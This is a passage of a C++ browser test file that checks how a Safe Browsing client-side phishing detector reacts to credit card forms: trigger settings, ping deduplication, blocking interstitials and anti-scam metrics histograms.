        kClientSideDetectionCreditCardForm,
        {
            {kCsdCreditCardFormHCAcceptanceRate.name, "0.0"},
            {kCsdCreditCardFormSampleRate.name, "1.0"},
            {kCsdCreditCardFormEnableDetectionTrigger.name, "true"},
            {kCsdCreditCardFormEnableInteractionTrigger.name, "false"},
        });
  }
};

class ClientSideDetectionHostCreditCardFormDetectionTriggerDisabledTest
    : public ClientSideDetectionHostCreditCardFormTest {
 public:
  ClientSideDetectionHostCreditCardFormDetectionTriggerDisabledTest() {
    scoped_feature_list_.Reset();
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {
            {kCsdCreditCardFormSampleRate.name, "1.0"},
            {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
            {kCsdCreditCardFormEnableDetectionTrigger.name, "false"},
        });
  }
};

class ClientSideDetectionHostCreditCardFormDetectionAndInteractionTest
    : public ClientSideDetectionHostCreditCardFormTest {
 public:
  ClientSideDetectionHostCreditCardFormDetectionAndInteractionTest() {
    scoped_feature_list_.Reset();
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {
            {kCsdCreditCardFormSampleRate.name, "1.0"},
            {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
            {kCsdCreditCardFormEnableDetectionTrigger.name, "true"},
        });
  }
};

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostCreditCardFormTest,
                       CreditCardFormTriggersPreclassificationCheck) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);

  // Form focus will trigger preclassification on credit card form interaction.
  base::RunLoop run_loop;
  csd_host->set_preclassification_done_callback_for_testing(
      base::BindLambdaForTesting([&](ClientSideDetectionType detection_type) {
        if (detection_type == ClientSideDetectionType::CREDIT_CARD_FORM) {
          run_loop.Quit();
        }
      }));
  NavigateToCreditCardForm();
  FocusOnCreditCardNumberField();
  run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 1);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostCreditCardFormTriggerDisabledTest,
                       InteractionTriggerDisabledDoesNotTrigger) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  // Navigate to a form, ensure that that completes, then focus on the form.
  // Only the latter should trigger a ping.
  // The reason for ensuring that they don't overlap is that there's some
  // flakiness at least in Windows if these events can overlap, where the
  // form detection event gets double counted in the
  // SBClientPhishing.CreditCardFormEvent3 histogram.

  NavigateToCreditCardForm();
  base::RunLoop nav_run_loop;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, nav_run_loop.QuitClosure(), base::Milliseconds(500));
  nav_run_loop.Run();

  FocusOnCreditCardNumberField();
  base::RunLoop focus_run_loop;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, focus_run_loop.QuitClosure(), base::Milliseconds(500));
  focus_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 2);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnAfterFocusOnFormField",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 1);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostCreditCardFormDetectionOnlyTest,
                       CreditCardFormTriggersDetectionCheckWithoutInteraction) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  csd_host->set_preclassification_done_callback_for_testing(
      base::BindLambdaForTesting([&](ClientSideDetectionType detection_type) {
        if (detection_type == ClientSideDetectionType::CREDIT_CARD_FORM) {
          run_loop.Quit();
        }
      }));

  NavigateToCreditCardForm();
  run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 1);
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostCreditCardFormDetectionTriggerDisabledTest,
    DetectionTriggerDisabledDoesNotTrigger) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  NavigateToCreditCardForm();

  // Wait for a short duration to ensure no ping is triggered by detection.
  base::RunLoop run_loop;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, run_loop.QuitClosure(), base::Milliseconds(500));
  run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnFieldTypesDetermined",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 1);

  // Focus should still trigger it.
  base::RunLoop focus_run_loop;
  csd_host->set_preclassification_done_callback_for_testing(
      base::BindLambdaForTesting([&](ClientSideDetectionType detection_type) {
        if (detection_type == ClientSideDetectionType::CREDIT_CARD_FORM) {
          focus_run_loop.Quit();
        }
      }));
  FocusOnCreditCardNumberField();
  focus_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 2);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnAfterFocusOnFormField",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 1);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostCreditCardFormTest,
                       CreditCardFormClassificationTriggersCSDPing) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.CreditCardForm", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.CreditCardForm", 0);

  // Navigate page, expecting to trigger 1 TriggerModel preclassification check.
  // Wait to ensure that it has happened since it will invalidate the host
  // weak pointer and effectively cancel any other pending check. This
  // ensures that the manual preclassification check below won't be clobbered.
  base::RunLoop nav_run_loop;
  csd_host->set_preclassification_done_callback_for_testing(
      base::BindLambdaForTesting([&](ClientSideDetectionType detection_type) {
        nav_run_loop.Quit();
      }));
  GURL url = NavigateToCreditCardForm();
  nav_run_loop.Run();

  base::RunLoop preclass_run_loop;
  fake_csd_service.SetRequestCallback(preclass_run_loop.QuitClosure());

  // Bypass the pre-classification check because it would otherwise return
  // `PreClassificationCheckResult::NO_CLASSIFY_PRIVATE_IP`.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::CREDIT_CARD_FORM,
      /*should_classify=*/true, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  preclass_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.CreditCardForm", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.CreditCardForm", 0);

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());
  std::move(fake_csd_service.saved_callback())
      .Run(url, true, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.CreditCardForm", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.CreditCardForm", 1);
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostCreditCardFormDetectionAndInteractionTest,
    DetectionAndInteractionTriggersOnlyTriggerOnce) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  // 1. Navigate triggers detection.
  base::RunLoop nav_run_loop;
  csd_host->set_preclassification_done_callback_for_testing(
      base::BindLambdaForTesting([&](ClientSideDetectionType detection_type) {
        if (detection_type == ClientSideDetectionType::CREDIT_CARD_FORM) {
          nav_run_loop.Quit();
        }
      }));
  NavigateToCreditCardForm();
  nav_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 1);

  // 2. Focus should be deduped.
  FocusOnCreditCardNumberField();

  // Wait for a short duration to ensure no SECOND ping is triggered.
  base::RunLoop dedup_run_loop;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, dedup_run_loop.QuitClosure(), base::Milliseconds(500));
  dedup_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 1);
}

class ClientSideDetectionHostGeminiAntiscamProtectionTest
    : public InProcessBrowserTest {
 public:
  ClientSideDetectionHostGeminiAntiscamProtectionTest() {
    scoped_feature_list_.InitAndEnableFeature(
        kGeminiAntiscamProtectionForMetricsCollection);
    prerender_helper_ = std::make_unique<
        content::test::PrerenderTestHelper>(base::BindRepeating(
        &ClientSideDetectionHostGeminiAntiscamProtectionTest::GetWebContents,
        base::Unretained(this)));
  }
  ~ClientSideDetectionHostGeminiAntiscamProtectionTest() override = default;
  ClientSideDetectionHostGeminiAntiscamProtectionTest(
      const ClientSideDetectionHostGeminiAntiscamProtectionTest&) = delete;
  ClientSideDetectionHostGeminiAntiscamProtectionTest& operator=(
      const ClientSideDetectionHostGeminiAntiscamProtectionTest&) = delete;

  void SetUp() override {
    prerender_helper_->RegisterServerRequestMonitor(embedded_test_server());
    InProcessBrowserTest::SetUp();
  }

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
  }

  content::test::PrerenderTestHelper& prerender_helper() {
    return *prerender_helper_.get();
  }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

 protected:
  base::test::ScopedFeatureList scoped_feature_list_;

 private:
  std::unique_ptr<content::test::PrerenderTestHelper> prerender_helper_;
  std::string flatbuffer_model_str_;
};

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostGeminiAntiscamProtectionTest,
                       GeminiAntiscamProtectionServiceCalledWithInnerText) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  base::HistogramTester histogram_tester;
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);
  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());

  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  prerender_helper().AddPrerender(initial_url);
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    prerender_helper().NavigatePrimaryPage(initial_url);
    paint_waiter.Wait();
  } else {
    prerender_helper().NavigatePrimaryPage(initial_url);
  }

  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::FORCE_REQUEST, /*should_classify=*/true,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  std::move(fake_csd_service.saved_callback())
      .Run(initial_url, true, net::HTTP_OK, std::nullopt);

  content::RunAllTasksUntilIdle();
  EXPECT_GT(
      histogram_tester
          .GetTotalCountsForPrefix("SafeBrowsing.GeminiAntiscamProtection")
          .size(),
      1);
  histogram_tester.ExpectUniqueSample(
      "SafeBrowsing.GeminiAntiscamProtection.IsHistoryServiceResultValid",
      /*sample=*/true,
      /*expected_bucket_count=*/1);
}

}  // namespace safe_browsing
